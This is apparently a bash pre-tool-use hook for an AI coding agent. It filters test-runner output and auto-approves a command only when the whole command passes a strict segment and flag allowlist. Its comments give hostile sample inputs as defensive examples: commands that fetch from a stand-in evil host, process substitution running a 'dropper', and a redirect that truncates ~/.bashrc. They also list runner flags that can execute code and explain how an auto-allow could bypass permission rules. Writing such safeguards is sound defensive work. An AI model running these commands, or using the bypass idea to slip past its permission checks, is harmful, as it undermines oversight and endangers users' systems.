#!/bin/bash
input=$(cat)
# One jq spawn: command + telemetry correlation ids (contract:telemetry-schema).
# The ids are single-line tokens read first; the command may be MULTILINE,
# so it goes last and `cat` consumes the remainder.
_sid="" _tuid="" cmd=""
{
  IFS= read -r _sid
  IFS= read -r _tuid
  cmd=$(cat)
} < <(echo "$input" | jq -r '(.session_id // ""), (.tool_use_id // ""), (.tool_input.command // "")' 2>/dev/null) || true
# git-bash jq emits CRLF on -r; `read`/`cat` keep the \r — strip it.
export CLAUDE_HOOK_SESSION_ID="${_sid%$'\r'}"
export CLAUDE_HOOK_TOOL_USE_ID="${_tuid%$'\r'}"
cmd="${cmd%$'\r'}"

# --- Profile / opt-out gate (TASK-011) -------------------------------
# Skip → emit the no-op passthrough so the original command runs unchanged.
_lib="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/lib/hook-common.sh"
# shellcheck source=/dev/null
[ -f "$_lib" ] && . "$_lib"
if command -v hook_enabled >/dev/null 2>&1 && ! hook_enabled filter-test-output normal; then
  echo "{}"; exit 0
fi

# Schema-v2 emit via hook-common.sh (contract:telemetry-schema). Lib
# absent → no event; telemetry is best-effort, the filter never is.
_log_event() {
  local outcome="$1" reason="${2:-}"
  local root; root=$(git rev-parse --show-toplevel 2>/dev/null) || return 0
  command -v telemetry_emit >/dev/null 2>&1 || return 0
  local class="ok"; [ "$outcome" = "passthrough" ] && class="skipped"
  # Optional skip-reason token (OPT r2 Phase 1') — see auto-lint.sh for the
  # vocabulary. test-filter's skip is irreducibly content-based (this Bash
  # command isn't a test command); a tool-name matcher cannot see it.
  local extra=""
  [ -n "$reason" ] && extra=",\"reason\":\"$reason\""
  telemetry_emit "$root" "test-filter" "$outcome" "$class" "$extra"
}

# Only rewrite (and auto-`allow`) when the WHOLE command is composed of `cd`
# and test-runner segments — never on a mere SUBSTRING match. The old
# `(^|&&|;)…` regex fired whenever a runner appeared at ANY segment start,
# so an arbitrary prefix (`curl evil.com; npm test`) inherited the
# `permissionDecision:"allow"` below and slipped past a consumer's own Bash
# `ask`/`deny` rules. Now we split the command on shell chain/pipe/background
# operators and require EVERY segment to be a `cd` or one of the known test
# runners; a single foreign segment → passthrough (the original command runs
# unchanged through the normal permission flow — the safe default). The
# framework's own documented invocation `cd 01_Project && npm test` still
# qualifies; the trailing class stops prefix false-positives (`npm testify`).
#
# The split is deliberately conservative: it does NOT honour shell quoting,
# so a runner arg that embeds an operator inside quotes (`pytest -k "a|b"`)
# simply falls to passthrough instead of being rewritten — erring toward the
# safe side, never toward over-allowing. Runner set covers the stack-agnostic
# dispatch targets.
#
# Runner ARGUMENTS are allowlisted too. The rewrite has to carry
# permissionDecision:"allow" (the hooks contract ignores updatedInput when the
# decision is omitted), and the runners themselves have exec- or write-capable
# flags that would ride along on that allow: `go test -exec`/`-toolexec`/
# `-ldflags=-extld=...`, `pytest -p <module>`/`--basetemp` (rm -rf's the dir)/
# `--pastebin`, `cargo test --config target.*.runner=...`/`-Z`, `npm test
# --script-shell=...`, `dotnet test --test-adapter-path`/`-s <runsettings>`. A
# denylist of those would always be one flag behind, so every argument must be
# a positional (package / path / test id / filter - never starting with `-`)
# or a flag on the per-runner read-only allowlist in _flag_kind below. Any
# other flag -> passthrough (the command still runs, through the normal
# permission flow, just unfiltered). Shell-expansion characters (`$` - incl.
# `$'\x2d...'` ANSI-C quoting - and glob/brace chars) are rejected unless
# _expansion_safe shows they cannot expand (single-quoted, or a glob word with
# a literal name/path prefix): otherwise they could expand into a flag the
# token scan never saw. Quotes and
# backslashes are stripped before classification, since the shell removes
# them too (`"--basetemp"` / `\-\-basetemp` reach the runner as the flag).
_TEST_SEG_RE='^(npm[[:space:]]+test|pytest|go[[:space:]]+test|dotnet[[:space:]]+test|cargo[[:space:]]+test)([^[:alnum:]_-]|$)'

# _flag_kind <runner-key> <flag-name> -> prints "bool" (no value), "val" (takes
# the next token unless given as --flag=value), "name" (a "val" whose value must
# be a BARE name - letters/digits/-/_ only), or nothing (not allowlisted).
# `--reporter` is "name": vitest/mocha/jest load a reporter given as a path
# (`--reporter=./x.js`) as a MODULE, i.e. run arbitrary code the scan cannot
# see; built-in / installed reporter names (dot, verbose, json, jest-junit) stay
# allowed.
# Runner keys: npm, npm--, pytest, go, cargo, cargo--, dotnet (the `--` keys
# are the arguments after a `--` separator, handed to the underlying runner /
# test binary).
_flag_kind() {
  case "$1:$2" in
    npm:--silent|npm:-s|npm:--if-present) echo bool ;;
    npm--:--run|npm--:--silent|npm--:--bail|npm--:--verbose|npm--:--passWithNoTests|npm--:--ci|npm--:--no-coverage) echo bool ;;
    npm--:-t|npm--:--testNamePattern|npm--:--testTimeout|npm--:--maxWorkers) echo val ;;
    npm--:--reporter) echo name ;;
    pytest:-v|pytest:-vv|pytest:-vvv|pytest:-q|pytest:-qq|pytest:-x|pytest:-s|pytest:-l) echo bool ;;
    pytest:--verbose|pytest:--quiet|pytest:--exitfirst|pytest:--showlocals|pytest:--lf|pytest:--last-failed) echo bool ;;
    pytest:--ff|pytest:--failed-first|pytest:--nf|pytest:--new-first|pytest:--sw|pytest:--stepwise) echo bool ;;
    pytest:--no-header|pytest:--no-summary|pytest:--co|pytest:--collect-only|pytest:--disable-warnings) echo bool ;;
    pytest:--strict-markers|pytest:--runxfail|pytest:--setup-show) echo bool ;;
    pytest:-k|pytest:-m|pytest:--tb|pytest:--maxfail|pytest:--durations|pytest:-n|pytest:--dist|pytest:-r) echo val ;;
    go:-v|go:-short|go:-race|go:-cover|go:-failfast|go:-json|go:-benchmem) echo bool ;;
    go:-run|go:-skip|go:-count|go:-timeout|go:-bench|go:-benchtime|go:-cpu|go:-parallel|go:-p|go:-shuffle|go:-tags|go:-covermode|go:-vet) echo val ;;
    cargo:-q|cargo:--quiet|cargo:-v|cargo:--verbose|cargo:--release|cargo:--lib|cargo:--bins|cargo:--tests|cargo:--doc) echo bool ;;
    cargo:--workspace|cargo:--all|cargo:--all-targets|cargo:--all-features|cargo:--no-default-features) echo bool ;;
    cargo:--no-fail-fast|cargo:--frozen|cargo:--locked|cargo:--offline) echo bool ;;
    cargo:-p|cargo:--package|cargo:--test|cargo:--bin|cargo:--example|cargo:--features|cargo:-F|cargo:-j|cargo:--jobs|cargo:--exclude) echo val ;;
    cargo--:--nocapture|cargo--:--exact|cargo--:--ignored|cargo--:--include-ignored|cargo--:--show-output|cargo--:-q|cargo--:--quiet|cargo--:--list) echo bool ;;
    cargo--:--test-threads|cargo--:--skip) echo val ;;
    dotnet:--no-build|dotnet:--no-restore|dotnet:--nologo) echo bool ;;
    dotnet:-c|dotnet:--configuration|dotnet:--filter|dotnet:-v|dotnet:--verbosity|dotnet:-f|dotnet:--framework) echo val ;;
  esac
}

# _runner_args_safe <runner-key> <args...> - 0 iff every arg is a positional
# or an allowlisted flag (see the Runner ARGUMENTS note above).
_runner_args_safe() {
  local key="$1"; shift
  local tok norm name kind want_val=0
  for tok in "$@"; do
    norm="${tok//\"/}"; norm="${norm//\'/}"; norm="${norm//\\/}"
    if [ "$want_val" != 0 ]; then
      case "$norm" in -*) return 1 ;; esac
      [ "$want_val" = 2 ] && { [[ "$norm" =~ ^[A-Za-z0-9_-]+$ ]] || return 1; }
      want_val=0
      continue
    fi
    if [ "$norm" = "--" ]; then
      case "$key" in
        npm|cargo) key="$key--"; continue ;;
        *) return 1 ;;
      esac
    fi
    case "$norm" in
      # `@file` = an argument/response file (pytest 8.2+, dotnet CLI): flags
      # read from a file the scan cannot see.
      @*) return 1 ;;
      -*)
        name="${norm%%=*}"
        kind=$(_flag_kind "$key" "$name")
        # pytest short-flag clusters (-xvs) and -r<chars> report selectors.
        if [ -z "$kind" ] && [ "$key" = pytest ]; then
          if [[ "$norm" =~ ^-r[a-zA-Z]+$ ]] || [[ "$norm" =~ ^-[vqxsl]+$ ]]; then
            kind=bool
          fi
        fi
        [ -n "$kind" ] || return 1
        if [ "$name" = "$norm" ]; then
          case "$kind" in val) want_val=1 ;; name) want_val=2 ;; esac
        elif [ "$kind" = name ]; then
          [[ "${norm#*=}" =~ ^[A-Za-z0-9_-]+$ ]] || return 1
        fi
        ;;
    esac
  done
  [ "$want_val" = 0 ]
}
# _expansion_safe <segment> - 0 iff no `$` / glob / brace character in the
# segment can expand. Inside single quotes bash expands nothing, so
# `go test -run 'TestX$'` / `-run 'Test.*'` are fine. An unquoted glob/brace
# character is fine only in a word that starts with a literal name/path
# character (`tests/test_a.py::test_b[param]`): every expansion keeps that
# prefix, so it can never turn into a flag. Unquoted `$`, a glob word starting
# with anything else (`*`, `{--basetemp=x,}`, `-*`), an unbalanced `'`, or any
# `"` / `\` alongside these characters (quoting too subtle to scan) -> unsafe.
_expansion_safe() {
  local s="$1" out="" w
  local -a words=()
  case "$s" in
    *'$'*|*'*'*|*'?'*|*'['*|*']'*|*'{'*|*'}'*) ;;
    *) return 0 ;;
  esac
  case "$s" in *'"'*|*'\'*) return 1 ;; esac
  # Blank each single-quoted span to `%` (not a safe word-start character, so
  # a word that begins with a quoted span is still judged conservatively).
  while [[ "$s" == *"'"* ]]; do
    out+="${s%%\'*}%"
    s="${s#*\'}"
    [[ "$s" == *"'"* ]] || return 1
    s="${s#*\'}"
  done
  out+="$s"
  case "$out" in *'$'*) return 1 ;; esac
  # read -a: word-split WITHOUT pathname expansion.
  read -r -a words <<< "$out"
  for w in ${words[@]+"${words[@]}"}; do
    case "$w" in
      *'*'*|*'?'*|*'['*|*']'*|*'{'*|*'}'*)
        [[ "$w" =~ ^[A-Za-z0-9_./:] ]] || return 1
        ;;
    esac
  done
  return 0
}
# Normalise shell operators to newlines so each simple command is one line.
# Order matters: two-char operators before their one-char prefixes.
_segments="${cmd//&&/$'\n'}"
_segments="${_segments//||/$'\n'}"
_segments="${_segments//|/$'\n'}"
_segments="${_segments//;/$'\n'}"
_segments="${_segments//&/$'\n'}"
_all_safe=1
_has_test=0
# A lone `&` (background) - i.e. any `&` left once `&&` is removed - makes the
# rewrite wrong (`npm test & > "$TMPF"` backgrounds the runner and captures
# nothing) and is never part of a plain test invocation -> passthrough.
case "${cmd//&&/}" in *'&'*) _all_safe=0 ;; esac
while IFS= read -r _seg; do
  # Trim surrounding whitespace.
  _seg="${_seg#"${_seg%%[![:space:]]*}"}"
  _seg="${_seg%"${_seg##*[![:space:]]}"}"
  [ -z "$_seg" ] && continue
  [ "$_all_safe" = 1 ] || break
  # Command substitution, process substitution, and redirections inside a
  # segment let an arbitrary command ride along (or an arbitrary file be
  # truncated) inside what otherwise looks like a bare runner invocation — the
  # prefix regex below only checks the START of the segment, so it would still
  # match and inherit the auto-`allow`. Concretely: `npm test $(curl evil)` and
  # the backtick form (command substitution); `npm test --reporter <(curl evil)`
  # / `>(sh dropper)` (process substitution — bash EXECUTES the inner command);
  # `npm test > ~/.bashrc` (redirection — bash opens+TRUNCATES the target). Test
  # runners never need `( ) < >` in the plain invocations this hook rewrites, so
  # treat any of them anywhere in the segment as foreign → passthrough, same as
  # a segment that isn't cd/test-runner at all.
  # `$` / glob / brace characters get the same treatment unless _expansion_safe
  # proves they cannot expand into text (possibly a flag) the argument
  # allowlist never sees.
  case "$_seg" in
    *'`'*|*'('*|*')'*|*'<'*|*'>'*)
      _all_safe=0
      break
      ;;
  esac
  if ! _expansion_safe "$_seg"; then
    _all_safe=0
    break
  fi
  if [[ "$_seg" =~ ^cd([[:space:]]|$) ]]; then
    continue
  elif [[ "$_seg" =~ $_TEST_SEG_RE ]]; then
    _runner="${BASH_REMATCH[1]}"
    _rest="${_seg:${#_runner}}"
    case "$_runner" in
      npm*) _rkey=npm ;; go*) _rkey=go ;; dotnet*) _rkey=dotnet ;; cargo*) _rkey=cargo ;; *) _rkey=pytest ;;
    esac
    # read -a: word-split on whitespace WITHOUT pathname expansion.
    _args=()
    read -r -a _args <<< "$_rest"
    if ! _runner_args_safe "$_rkey" ${_args[@]+"${_args[@]}"}; then
      _all_safe=0
      break
    fi
    _has_test=1
  else
    _all_safe=0
    break
  fi
done <<< "$_segments"

if [ "$_all_safe" = "1" ] && [ "$_has_test" = "1" ]; then
  # Write full test output to a tempfile (preserves $cmd's exit code in $?),
  # then filter the tempfile for display. No pipeline between $cmd and the
  # filter — so we sidestep PIPESTATUS / pipefail subtleties entirely.
  # Fresh tempfile per invocation via mktemp — portable across Windows
  # Git Bash (where /tmp is emulated with variable reliability) and POSIX
  # systems, and collision-safe if Claude Code ever runs test commands
  # in parallel. The \$(mktemp) / \$TMPF / \$? / \$TEST_EXIT are escaped
  # so they're evaluated by the OUTER shell when the rewritten command
  # actually runs, not here.
  # grep is case-INSENSITIVE (`-i`) so lowercase success/failure vocabulary is
  # caught — pytest `5 passed`, dotnet `Passed!`/`Failed!` — not just the
  # uppercase tokens. And the summary block (always at the END of a run) is
  # `tail`'d UNCONDITIONALLY, so a green pytest/go/dotnet run whose output the
  # grep doesn't match (e.g. go's `ok  pkg  0.31s`) is never displayed as
  # EMPTY — the model always sees the result. Both stay bounded (head/tail).
  filtered_cmd="TMPF=\$(mktemp); $cmd > \"\$TMPF\" 2>&1; TEST_EXIT=\$?; grep -iA 5 -E '(fail|error|pass|✓|✗)' \"\$TMPF\" | head -100; echo '---- last 15 lines ----'; tail -n 15 \"\$TMPF\"; rm -f \"\$TMPF\"; exit \$TEST_EXIT"
  # Use jq --arg to safely embed the rewritten command — $cmd may contain
  # double-quotes or backslashes (e.g. --testNamePattern="foo"), which
  # would corrupt manually-built JSON.
  jq -cn --arg cmd "$filtered_cmd" \
    '{hookSpecificOutput:{hookEventName:"PreToolUse",permissionDecision:"allow",updatedInput:{command:$cmd}}}'
  _log_event "filtered"
else
  echo "{}"
  _log_event "passthrough" "not-test-cmd"
fi
